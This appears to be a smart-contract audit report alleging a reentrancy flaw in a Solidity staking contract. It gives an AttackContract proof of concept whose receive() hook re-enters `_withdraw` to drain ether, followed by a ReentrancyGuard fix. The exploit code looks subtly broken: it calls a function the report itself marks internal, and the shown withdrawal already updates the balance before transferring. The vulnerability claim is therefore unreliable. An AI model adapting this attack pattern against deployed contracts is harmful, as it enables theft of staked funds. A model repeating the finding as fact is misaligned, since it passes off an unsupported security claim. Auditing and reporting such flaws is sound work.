# Vulnerability details

## Impact
An attacker could exploit reentrancy to withdraw more funds than intended, draining the contract.



## Proof of Concept
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./StakingNativeToken.sol";

contract AttackContract {
    StakingNativeToken public stakingContract;

    constructor(address _stakingContract) {
        stakingContract = StakingNativeToken(_stakingContract);
    }

    // Fallback function to initiate reentrancy
    receive() external payable {
        if (address(stakingContract).balance > 1 ether) {
            stakingContract._withdraw(address(this), 1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        stakingContract._withdraw(address(this), 1 ether);
    }
}
```

// Usage
// 1. Deploy StakingNativeToken with some initial balance.
// 2. Deploy AttackContract with the address of StakingNativeToken.
// 3. Call `attack` on AttackContract with at least 1 ether.
// 4. Reentrancy attack drains funds from StakingNativeToken.



## Tools Used
Remix & vscode

## Recommended Mitigation Steps

Use OpenZeppelin's ReentrancyGuard to prevent reentrant calls.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./StakingBase.sol";

/// @dev Failure of a transfer.
/// @param token Address of a token.
/// @param from Address `from`.
/// @param to Address `to`.
/// @param value Value.
error TransferFailed(address token, address from, address to, uint256 value);

/// @title StakingNativeToken - Smart contract for staking a service with the service having a native network token as the deposit
/// @dev Adding ReentrancyGuard to mitigate reentrancy attacks.
contract StakingNativeToken is StakingBase, ReentrancyGuard {
    /// @dev StakingNativeToken initialization.
    /// @param _stakingParams Service staking parameters.
    function initialize(StakingParams memory _stakingParams) external {
        _initialize(_stakingParams);
    }

    /// @dev Withdraws the reward amount to a service owner.
    /// @notice The balance is always greater or equal the amount, as follows from the Base contract logic.
    /// @param to Address to.
    /// @param amount Amount to withdraw.
    function _withdraw(address to, uint256 amount) internal override nonReentrant {
        // Update the contract balance
        balance -= amount;

        // Transfer the amount
        (bool success, ) = to.call{value: amount}("");
        if (!success) {
            revert TransferFailed(address(0), address(this), to, amount);
        }
    }

    receive() external payable {
        // Add to the contract and available rewards balances
        uint256 newBalance = balance + msg.value;
        uint256 newAvailableRewards = availableRewards + msg.value;

        // Record the new actual balance and available rewards
        balance = newBalance;
        availableRewards = newAvailableRewards;

        emit Deposit(msg.sender, msg.value, newBalance, newAvailableRewards);
    }
}
```

Changes Made:

Inheritance: `StakingNativeToken` now inherits from `ReentrancyGuard`.

Modifier: Added `nonReentrant` modifier to the `_withdraw` function to prevent reentrancy attacks.


